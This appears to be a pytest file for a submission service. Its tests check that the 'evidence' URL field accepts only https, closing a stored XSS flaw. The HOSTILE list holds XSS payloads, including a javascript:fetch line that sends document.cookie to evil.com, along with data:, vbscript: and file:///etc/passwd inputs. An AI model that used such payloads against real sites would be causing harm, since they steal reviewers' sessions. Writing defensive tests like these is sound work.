"""Evidence URL scheme allow-listing (finding f-74a4a413).

The submitted `evidence` value is rendered as a clickable href in the leader
approval queue and the Point Ledger. It used to be validated with require_str,
which rejects only '<' and '>' — so a `javascript:` URI passed straight through
and executed in a reviewer's session when clicked. These tests pin the write
boundary shut.
"""
from __future__ import annotations

import pathlib
import sys

import pytest

SRC = str(pathlib.Path(__file__).resolve().parents[1] / "src")
if SRC not in sys.path:
    sys.path.insert(0, SRC)

from _conventions.errors import ValidationError  # noqa: E402
from submission_service import SubmissionService  # noqa: E402

HOSTILE = [
    "javascript:alert(1)",
    "javascript:fetch('https://evil.com/'+document.cookie)",
    "JavaScript:alert(1)",              # scheme casing must not bypass the check
    "JAVASCRIPT:alert(1)",
    "  javascript:alert(1)",            # leading whitespace must not bypass it
    "\tjavascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "http://insecure.example.com",      # https only — http is a transport downgrade
    "//example.com/protocol-relative",
    "/relative/path",
    "example.com",                      # no scheme at all
    "https://",                         # bare scheme, no host
]


def _submit(svc, member, evidence):
    return svc.submit({"groupId": "g-serverless", "activity": "blog",
                       "evidence": evidence, "description": "x"}, principal=member)


@pytest.mark.parametrize("evidence", HOSTILE)
def test_rejects_non_https_evidence(repo, framework, member, evidence):
    svc = SubmissionService(repo, framework)
    with pytest.raises(ValidationError):
        _submit(svc, member, evidence)


def test_nothing_is_persisted_when_evidence_is_rejected(repo, framework, member):
    """Rejection must happen before the write, not after."""
    svc = SubmissionService(repo, framework)
    with pytest.raises(ValidationError):
        _submit(svc, member, "javascript:alert(1)")
    assert svc.my_submissions(principal=member)["items"] == []


def test_accepts_https_evidence(repo, framework, member):
    svc = SubmissionService(repo, framework)
    sub = _submit(svc, member, "https://blog.example.com/my-post?a=1#x")
    assert sub["status"] == "Pending"
    assert repo.get_submission(sub["id"])["evidenceUrl"] == "https://blog.example.com/my-post?a=1#x"


def test_surrounding_whitespace_is_rejected_not_silently_trimmed(repo, framework, member):
    """A trailing-space variant of a valid URL is a client bug worth surfacing,
    and accepting-then-trimming would mean the stored value differs from what
    was validated."""
    svc = SubmissionService(repo, framework)
    with pytest.raises(ValidationError):
        _submit(svc, member, "https://blog.example.com ")


def test_error_names_the_evidence_field(repo, framework, member):
    """The SPA maps details[].field back to the form input, so the field name
    has to be `evidence`, not a generic message."""
    svc = SubmissionService(repo, framework)
    with pytest.raises(ValidationError) as exc:
        _submit(svc, member, "javascript:alert(1)")
    fields = [d.get("field") for d in (getattr(exc.value, "details", None) or [])]
    assert "evidence" in fields
